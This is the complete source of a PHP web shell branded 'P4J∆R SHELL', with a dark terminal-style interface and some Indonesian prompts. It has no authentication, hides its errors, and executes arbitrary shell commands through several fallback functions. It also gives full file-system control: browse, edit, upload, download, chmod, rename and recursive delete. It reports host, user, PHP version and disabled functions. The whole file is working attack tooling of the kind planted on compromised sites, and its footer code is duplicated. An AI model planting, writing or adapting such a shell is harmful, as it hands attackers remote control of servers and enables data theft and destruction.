<?php
error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);

function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function sx($cmd){
    if (function_exists('shell_exec'))  return @shell_exec($cmd);
    if (function_exists('system'))      { ob_start(); @system($cmd); return ob_get_clean(); }
    if (function_exists('passthru'))    { ob_start(); @passthru($cmd); return ob_get_clean(); }
    if (function_exists('exec'))        { $o=[]; @exec($cmd,$o); return implode("\n",$o); }
    if (function_exists('popen'))       { $h=@popen($cmd,'r'); if(!$h) return ''; $r=stream_get_contents($h); pclose($h); return $r; }
    if (function_exists('proc_open'))   {
        $d=[1=>['pipe','w'],2=>['pipe','w']];
        $p=@proc_open($cmd,$d,$pp);
        if(!is_resource($p)) return '';
        $out=stream_get_contents($pp[1]).stream_get_contents($pp[2]);
        fclose($pp[1]); fclose($pp[2]); proc_close($p);
        return $out;
    }
    return '';
}

function fsize($b){
    if ($b < 1024)         return $b.' B';
    if ($b < 1048576)      return number_format($b/1024,1).' KB';
    if ($b < 1073741824)   return number_format($b/1048576,1).' MB';
    return number_format($b/1073741824,2).' GB';
}

function fclass($name,$isDir){
    if ($isDir) return 'f-dir';
    $e = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (in_array($e,['jpg','jpeg','png','gif','bmp','webp','svg','ico'])) return 'f-img';
    if (in_array($e,['php','phtml','php3','php4','php5','php7','phar','py','pl','rb','cgi','sh','bash','exe','dll','so','bin'])) return 'f-exec';
    if (in_array($e,['zip','rar','7z','tar','gz','bz2','xz'])) return 'f-arch';
    if (in_array($e,['txt','md','doc','docx','pdf','odt','rtf','log','ini','conf','cfg','yml','yaml','json','xml','html','htm','css'])) return 'f-doc';
    return 'f-code';
}

function cuser(){
    if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')){
        $u = @posix_getpwuid(posix_geteuid());
        if (is_array($u) && !empty($u['name'])) return $u['name'];
    }
    if (!empty($_SERVER['USERNAME'])) return $_SERVER['USERNAME'];
    if (!empty($_SERVER['USER']))     return $_SERVER['USER'];
    $u = @get_current_user();
    return $u ?: '?';
}

function rrmdir($dir){
    if (!is_dir($dir) || is_link($dir)) return @unlink($dir);
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $it){
        if ($it === '.' || $it === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $it;
        if (is_dir($p) && !is_link($p)) rrmdir($p);
        else @unlink($p);
    }
    return @rmdir($dir);
}

$msg = ''; $err = '';
$isPost = ($_SERVER['REQUEST_METHOD'] === 'POST');
$act    = $isPost && isset($_POST['act']) ? $_POST['act'] : '';

$cwd = null;
if ($isPost && !empty($_POST['cwd']) && @is_dir($_POST['cwd'])) $cwd = @realpath($_POST['cwd']);
if ($cwd === null && !empty($_GET['c'])) $cwd = @realpath($_GET['c']);
if ($cwd === null || $cwd === false) $cwd = @getcwd();
if ($cwd === false || $cwd === null) $cwd = '.';

$sep      = DIRECTORY_SEPARATOR;
$cwdSlash = rtrim($cwd, $sep);

if ($act !== ''){
    if ($act === 'exec' && isset($_POST['cmd'])){
        $c = trim($_POST['cmd']);
        if ($c !== ''){
            $out = sx('cd ' . escapeshellarg($cwd) . ' && ' . $c . ' 2>&1');
            $msg = $out === null ? '' : $out;
        }
    }
    elseif ($act === 'edit' && isset($_POST['path'], $_POST['content'])){
        $p = $_POST['path'];
        if (@file_put_contents($p, $_POST['content']) !== false) $msg = 'saved: ' . $p;
        else                                                     $err = 'write failed: ' . $p;
    }
    elseif ($act === 'newfile' && isset($_POST['name'])){
        $n = trim($_POST['name']);
        if ($n === ''){ $err = 'empty name'; }
        else {
            $p = $cwdSlash . $sep . $n;
            if (file_exists($p))                                 $err = 'already exists: ' . $n;
            elseif (@file_put_contents($p,'') !== false)         $msg = 'created: ' . $n;
            else                                                 $err = 'create failed';
        }
    }
    elseif ($act === 'mkdir' && isset($_POST['name'])){
        $n = trim($_POST['name']);
        if ($n === ''){ $err = 'empty name'; }
        else {
            $p = $cwdSlash . $sep . $n;
            if (@mkdir($p, 0755)) $msg = 'dir created: ' . $n;
            else                  $err = 'mkdir failed';
        }
    }
    elseif ($act === 'delete' && isset($_POST['path'])){
        $p  = $_POST['path'];
        $ok = false;
        if (is_dir($p) && !is_link($p)) $ok = rrmdir($p);
        elseif (is_file($p) || is_link($p)) $ok = @unlink($p);
        if ($ok) $msg = 'deleted: ' . basename($p);
        else     $err = 'delete failed: ' . basename($p);
    }
    elseif ($act === 'rename' && isset($_POST['path'], $_POST['new'])){
        $old = $_POST['path'];
        $n   = trim($_POST['new']);
        if ($n === ''){ $err = 'empty new name'; }
        else {
            $dst = rtrim(dirname($old), $sep) . $sep . $n;
            if (@rename($old, $dst)) $msg = 'renamed';
            else                     $err = 'rename failed';
        }
    }
    elseif ($act === 'chmod' && isset($_POST['path'], $_POST['mode'])){
        $m = trim($_POST['mode']);
        if ($m !== '' && @chmod($_POST['path'], octdec($m))) $msg = 'chmod ok';
        else                                                $err = 'chmod failed';
    }
    elseif ($act === 'upload' && isset($_FILES['f'])){
        $f = $_FILES['f'];
        if (!is_array($f) || !isset($f['error'])){
            $err = 'no file';
        } elseif ($f['error'] === UPLOAD_ERR_OK){
            $dst = $cwdSlash . $sep . basename($f['name']);
            if (@move_uploaded_file($f['tmp_name'], $dst)) $msg = 'uploaded: ' . basename($f['name']);
            else                                          $err = 'upload failed (permission?)';
        } elseif ($f['error'] === UPLOAD_ERR_INI_SIZE || $f['error'] === UPLOAD_ERR_FORM_SIZE){
            $err = 'upload too large (php.ini limit)';
        } elseif ($f['error'] !== UPLOAD_ERR_NO_FILE){
            $err = 'upload error #' . $f['error'];
        }
    }
}

if (isset($_GET['dl'])){
    $f = $_GET['dl'];
    if (@is_file($f) && @is_readable($f)){
        while (ob_get_level() > 0) ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        @readfile($f);
        exit;
    }
}

if (isset($_GET['view'])){
    $f = $_GET['view'];
    if (@is_file($f)){
        $e = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $mimes = ['jpg'=>'image/jpeg','jpeg'=>'image/jpeg','png'=>'image/png','gif'=>'image/gif',
                  'bmp'=>'image/bmp','webp'=>'image/webp','svg'=>'image/svg+xml','ico'=>'image/x-icon'];
        if (isset($mimes[$e])){
            while (ob_get_level() > 0) ob_end_clean();
            header('Content-Type: ' . $mimes[$e]);
            header('Content-Length: ' . filesize($f));
            @readfile($f);
            exit;
        }
    }
}

$editing = null;
if (isset($_GET['edit']) && @is_file($_GET['edit']) && @is_readable($_GET['edit'])){
    $editing = $_GET['edit'];
}

$host = function_exists('gethostname') ? @gethostname() : '';
if (!$host) $host = @php_uname('n');
if (!$host) $host = 'unknown';

$sysOs   = trim(@php_uname('s') . ' ' . @php_uname('r'));
$sysArch = @php_uname('m');
$sysUser = cuser();
$sysPhp  = PHP_VERSION;
$sysIp   = $_SERVER['SERVER_ADDR'] ?? ($_SERVER['LOCAL_ADDR'] ?? '');

$crumbs = [];
$parts  = explode($sep, $cwd);
$acc    = '';
foreach ($parts as $i => $p){
    if ($i === 0){
        if ($p === ''){ $acc = '/';              $crumbs[] = ['/', $acc]; }
        else          { $acc = $p . $sep;        $crumbs[] = [$p, $acc]; }
    } else {
        if ($p === '') continue;
        $acc = rtrim($acc, $sep) . $sep . $p;
        $crumbs[] = [$p, $acc];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>P4J∆R SHELL</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
    --bg:#0a0c0a; --panel:#0e110e; --panel2:#121612;
    --line:#1c221c; --line2:#252d25;
    --fg:#c8d4c8; --dim:#5a6b5a; --dim2:#3d473d;
    --accent:#4ade80; --accent-dim:#1f3d2a;
    --danger:#e06a6a; --warn:#e0b96a; --info:#6aa8e0; --arch:#b58ce0;
}
html,body{background:var(--bg);color:var(--fg);font-family:"JetBrains Mono","Menlo",Consolas,monospace;font-size:13px;line-height:1.55;min-height:100%}
body{padding:22px;max-width:1180px;margin:0 auto}
a{color:var(--accent);text-decoration:none}
a:hover{text-decoration:underline}
a.dim{color:var(--dim)}
header{display:flex;align-items:baseline;justify-content:space-between;border-bottom:1px solid var(--line2);padding-bottom:14px;margin-bottom:22px;flex-wrap:wrap;gap:10px}
.logo{font-size:20px;letter-spacing:.14em;color:var(--accent);text-shadow:0 0 12px rgba(74,222,128,.25);font-weight:400}
.logo .delta{color:var(--fg)}
.logo .sep{color:var(--dim2);margin:0 6px}
.meta{color:var(--dim);font-size:11px;letter-spacing:.05em;text-align:right;line-height:1.7}
.meta b{color:var(--fg);font-weight:400}
.meta .dot{color:var(--dim2);margin:0 6px}
.cmdbar{background:var(--panel);border:1px solid var(--line);padding:10px 12px;margin-bottom:14px;display:flex;gap:8px;align-items:center}
.cmdbar .prompt{color:var(--accent);font-size:13px;user-select:none}
.cmdbar input[type=text]{flex:1;background:transparent;border:none;outline:none;color:var(--fg);font:inherit;padding:2px 0}
.cmdbar input[type=text]::placeholder{color:var(--dim2)}
.out{background:var(--panel);border:1px solid var(--line);padding:12px 14px;margin-bottom:14px;white-space:pre-wrap;word-break:break-all;font-size:12.5px;color:var(--fg);max-height:420px;overflow:auto}
.out.err{color:var(--danger);border-color:#2a1a1a}
.path{color:var(--dim);font-size:11.5px;margin-bottom:12px;word-break:break-all}
.path a{color:var(--fg)}
.path a:hover{color:var(--accent)}
.path .sep{color:var(--dim2);margin:0 4px}
.path .cur{color:var(--accent)}
.actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px;align-items:center}
.btn{display:inline-block;background:var(--panel);border:1px solid var(--line2);color:var(--fg);padding:7px 14px;font:inherit;font-size:12px;cursor:pointer;letter-spacing:.03em;transition:background .12s,border-color .12s}
.btn:hover{background:var(--panel2);border-color:var(--accent-dim)}
.btn.primary{color:var(--accent);border-color:var(--accent-dim)}
.btn.danger{color:var(--danger);border-color:#3a2222}
.btn.danger:hover{border-color:var(--danger)}
table{width:100%;border-collapse:collapse;font-size:12.5px;background:var(--panel);border:1px solid var(--line)}
th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--dim);font-weight:400;font-size:10.5px;text-transform:uppercase;letter-spacing:.14em;background:var(--panel2);border-bottom:1px solid var(--line2);user-select:none}
tr:last-child td{border-bottom:none}
tbody tr:hover td{background:var(--panel2)}
td.name{width:auto;word-break:break-all}
td.size{width:110px;color:var(--dim);font-variant-numeric:tabular-nums;white-space:nowrap}
td.perm{width:70px;color:var(--dim);font-variant-numeric:tabular-nums;white-space:nowrap}
td.mtime{width:145px;color:var(--dim);font-variant-numeric:tabular-nums;white-space:nowrap}
td.ops{width:230px;white-space:nowrap}
.f-dir{color:var(--info)}
.f-code{color:var(--fg)}
.f-img{color:var(--warn)}
.f-exec{color:var(--danger)}
.f-arch{color:var(--arch)}
.f-doc{color:#8ec9b0}
.op{color:var(--dim);font-size:11px;margin-right:10px;cursor:pointer}
.op:hover{color:var(--accent)}
.op.del:hover{color:var(--danger)}
textarea{width:100%;min-height:520px;background:var(--panel);border:1px solid var(--line);color:var(--fg);font:12.5px/1.55 "JetBrains Mono","Menlo",Consolas,monospace;padding:14px;outline:none;resize:vertical}
textarea:focus{border-color:var(--accent-dim)}
.edit-head{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;flex-wrap:wrap;gap:8px}
.edit-head .fname{color:var(--accent);font-size:12.5px;word-break:break-all}
.edit-actions{display:flex;gap:8px;margin-top:10px}
footer{margin-top:24px;padding-top:14px;border-top:1px solid var(--line);color:var(--dim2);font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
footer b{color:var(--dim);font-weight:400}
@media (max-width:760px){
    body{padding:12px}
    .meta{text-align:left}
    td.perm,td.mtime,th.perm,th.mtime{display:none}
    td.ops{width:auto}
    .op{margin-right:8px}
}
</style>
</head>
<body>

<header>
    <div class="logo">P4J<span class="delta">∆</span>R<span class="sep">/</span>SHELL</div>
    <div class="meta">
        <div><b><?=h($host)?></b><span class="dot">|</span><?=h($sysOs)?><?php if($sysArch): ?><span class="dot">|</span><?=h($sysArch)?><?php endif; ?></div>
        <div>uid=<b><?=h($sysUser)?></b><span class="dot">|</span>php <b><?=h($sysPhp)?></b><?php if($sysIp): ?><span class="dot">|</span><?=h($sysIp)?><?php endif; ?></div>
    </div>
</header>

<form method="post" class="cmdbar">
    <input type="hidden" name="act" value="exec">
    <input type="hidden" name="cwd" value="<?=h($cwd)?>">
    <span class="prompt">$</span>
    <input type="text" name="cmd" placeholder="id; uname -a" value="<?=h(isset($_POST['cmd'])?$_POST['cmd']:'')?>" autofocus>
</form>

<?php if ($msg !== ''): ?><pre class="out"><?=h($msg)?></pre><?php endif; ?>
<?php if ($err !== ''): ?><pre class="out err"><?=h($err)?></pre><?php endif; ?>

<?php if ($editing !== null): ?>

    <div class="edit-head">
        <div class="fname">editing: <?=h($editing)?></div>
        <div class="dim" style="color:var(--dim);font-size:11px"><?=h(fsize(@filesize($editing)))?></div>
    </div>

    <form method="post">
        <input type="hidden" name="act" value="edit">
        <input type="hidden" name="cwd" value="<?=h($cwd)?>">
        <input type="hidden" name="path" value="<?=h($editing)?>">
        <textarea name="content" spellcheck="false" autofocus><?=h(@file_get_contents($editing))?></textarea>
        <div class="edit-actions">
            <button class="btn primary" type="submit">save</button>
            <a class="btn" href="?c=<?=urlencode($cwd)?>">cancel</a>
            <a class="btn" href="?dl=<?=urlencode($editing)?>">download</a>
        </div>
    </form>

<?php else: ?>

    <div class="path">
    <?php foreach ($crumbs as $i => $c): ?>
        <?php if ($i > 0): ?><span class="sep">/</span><?php endif; ?>
        <?php if ($i === count($crumbs)-1): ?>
            <span class="cur"><?=h($c[0])?></span>
        <?php else: ?>
            <a href="?c=<?=urlencode($c[1])?>"><?=h($c[0])?></a>
        <?php endif; ?>
    <?php endforeach; ?>
    </div>

    <div class="actions">
        <form method="post" enctype="multipart/form-data" style="display:inline">
            <input type="hidden" name="act" value="upload">
            <input type="hidden" name="cwd" value="<?=h($cwd)?>">
            <label class="btn primary">upload
                <input type="file" name="f" onchange="this.form.submit()" style="display:none">
            </label>
        </form>
        <button class="btn" type="button" onclick="newFile()">new file</button>
        <button class="btn" type="button" onclick="newDir()">new dir</button>
        <a class="btn" href="?c=<?=urlencode($cwd)?>">refresh</a>
    </div>

    <table>
    <thead>
    <tr>
        <th>name</th>
        <th class="size">size</th>
        <th class="perm">perm</th>
        <th class="mtime">modified</th>
        <th>operations</th>
    </tr>
    </thead>
    <tbody>
    <?php
    $items = @scandir($cwd);
    if ($items === false){
        echo '<tr><td colspan="5" style="color:var(--danger)">cannot read directory (permission denied)</td></tr>';
    } else {
        $parent = @dirname($cwd);
        if ($parent && $parent !== $cwd){
            echo '<tr><td class="name"><a class="f-dir" href="?c=' . urlencode($parent) . '">..</a></td>'
               . '<td class="size">—</td><td class="perm">—</td><td class="mtime">—</td><td class="ops"></td></tr>';
        }

        $dirs = []; $files = [];
        foreach ($items as $it){
            if ($it === '.' || $it === '..') continue;
            $full = $cwdSlash . $sep . $it;
            if (@is_dir($full)) $dirs[] = $it;
            else                $files[] = $it;
        }
        sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
        sort($files, SORT_NATURAL | SORT_FLAG_CASE);

        foreach (array_merge($dirs, $files) as $it){
            $full   = $cwdSlash . $sep . $it;
            $isDir  = @is_dir($full);
            $cls    = fclass($it, $isDir);
            $size   = $isDir ? '—' : fsize(@filesize($full));
            $perm   = @substr(sprintf('%o', @fileperms($full)), -4);
            $mtime  = @date('Y-m-d H:i', @filemtime($full));

            if ($isDir) $nameLink = '<a class="'.$cls.'" href="?c=' . urlencode($full) . '">' . h($it) . '</a>';
            else        $nameLink = '<a class="'.$cls.'" href="?dl=' . urlencode($full) . '">' . h($it) . '</a>';

            $ops = [];
            if ($isDir){
                $ops[] = '<a class="op" href="?c=' . urlencode($full) . '">open</a>';
                $ops[] = '<a class="op" href="#" onclick="renameTo(' . json_encode($full) . ',' . json_encode($it) . ');return false">rename</a>';
                $ops[] = '<a class="op" href="#" onclick="chmodPath(' . json_encode($full) . ',' . json_encode($perm) . ');return false">chmod</a>';
                $ops[] = '<a class="op del" href="#" onclick="delPath(' . json_encode($full) . ',' . json_encode($it) . ');return false">delete</a>';
            } else {
                $ops[] = '<a class="op" href="?c=' . urlencode($cwd) . '&edit=' . urlencode($full) . '">edit</a>';
                $ops[] = '<a class="op" href="?dl=' . urlencode($full) . '">download</a>';
                if (preg_match('/\.(jpg|jpeg|png|gif|bmp|webp|svg|ico)$/i', $it)){
                    $ops[] = '<a class="op" href="?view=' . urlencode($full) . '" target="_blank">view</a>';
                }
                $ops[] = '<a class="op" href="#" onclick="renameTo(' . json_encode($full) . ',' . json_encode($it) . ');return false">rename</a>';
                $ops[] = '<a class="op" href="#" onclick="chmodPath(' . json_encode($full) . ',' . json_encode($perm) . ');return false">chmod</a>';
                $ops[] = '<a class="op del" href="#" onclick="delPath(' . json_encode($full) . ',' . json_encode($it) . ');return false">delete</a>';
            }

            echo '<tr>';
            echo '<td class="name">' . $nameLink . '</td>';
            echo '<td class="size">' . h($size) . '</td>';
            echo '<td class="perm">' . h($perm) . '</td>';
            echo '<td class="mtime">' . h($mtime) . '</td>';
            echo '<td class="ops">' . implode('', $ops) . '</td>';
            echo '</tr>';
        }

        if (empty($dirs) && empty($files)){
            echo '<tr><td colspan="5" style="color:var(--dim)">empty directory</td></tr>';
        }
    }
    ?>
    </tbody>
    </table>

<?php endif; ?>

<footer>
    <span>P4J∆R SHELL <b>v1.0</b> — single file</span>
    <span>
        <?php
        $exec_ok = function_exists('shell_exec') || function_exists('system') || function_exists('passthru')
                || function_exists('exec') || function_exists('popen') || function_exists('proc_open');
        $up = ini_get('file_uploads') ? 'on' : 'off';
        ?>
        exec: <b><?= $exec_ok ? 'ok' : 'off' ?></b>
        <span class="dot" style="color:var(--dim2);margin:0 6px">|</span>
        upload: <b><?= $up ?></b>
                <?php
        $exec_ok = function_exists('shell_exec') || function_exists('system') || function_exists('passthru')
                || function_exists('exec') || function_exists('popen') || function_exists('proc_open');
        $up = ini_get('file_uploads') ? 'on' : 'off';
        ?>
        exec: <b><?= $exec_ok ? 'ok' : 'off' ?></b>
        <span class="dot" style="color:var(--dim2);margin:0 6px">|</span>
        upload: <b><?= $up ?></b>
        <?php if (function_exists('ini_get') && ini_get('disable_functions')): ?>
            <span class="dot" style="color:var(--dim2);margin:0 6px">|</span>
            disabled: <b><?= h(ini_get('disable_functions')) ?></b>
        <?php endif; ?>
    </span>
</footer>

<script>
function newFile(){
  var n = prompt('nama file baru:');
  if(!n) return;
  var f = document.createElement('form');
  f.method='post';
  f.innerHTML = '<input name="act" value="newfile">'
    + '<input name="cwd" value="' + <?=json_encode($cwd)?> + '">'
    + '<input name="name" value="' + n.replace(/"/g,'&quot;') + '">';
  document.body.appendChild(f);
  f.submit();
}
function newDir(){
  var n = prompt('nama folder baru:');
  if(!n) return;
  var f = document.createElement('form');
  f.method='post';
  f.innerHTML = '<input name="act" value="mkdir">'
    + '<input name="cwd" value="' + <?=json_encode($cwd)?> + '">'
    + '<input name="name" value="' + n.replace(/"/g,'&quot;') + '">';
  document.body.appendChild(f);
  f.submit();
}
function renameTo(path, oldName){
  var n = prompt('rename "' + oldName + '" ke:', oldName);
  if(!n || n === oldName) return;
  var f = document.createElement('form');
  f.method='post';
  f.innerHTML = '<input name="act" value="rename">'
    + '<input name="cwd" value="' + <?=json_encode($cwd)?> + '">'
    + '<input name="path" value="' + path.replace(/"/g,'&quot;') + '">'
    + '<input name="new" value="' + n.replace(/"/g,'&quot;') + '">';
  document.body.appendChild(f);
  f.submit();
}
function chmodPath(path, oldMode){
  var m = prompt('chmod "' + path + '" (octal):', oldMode || '0755');
  if(!m) return;
  var f = document.createElement('form');
  f.method='post';
  f.innerHTML = '<input name="act" value="chmod">'
    + '<input name="cwd" value="' + <?=json_encode($cwd)?> + '">'
    + '<input name="path" value="' + path.replace(/"/g,'&quot;') + '">'
    + '<input name="mode" value="' + m.replace(/"/g,'&quot;') + '">';
  document.body.appendChild(f);
  f.submit();
}
function delPath(path, name){
  if(!confirm('hapus "' + name + '"?')) return;
  var f = document.createElement('form');
  f.method='post';
  f.innerHTML = '<input name="act" value="delete">'
    + '<input name="cwd" value="' + <?=json_encode($cwd)?> + '">'
    + '<input name="path" value="' + path.replace(/"/g,'&quot;') + '">';
  document.body.appendChild(f);
  f.submit();
}
</script>

</body>
</html>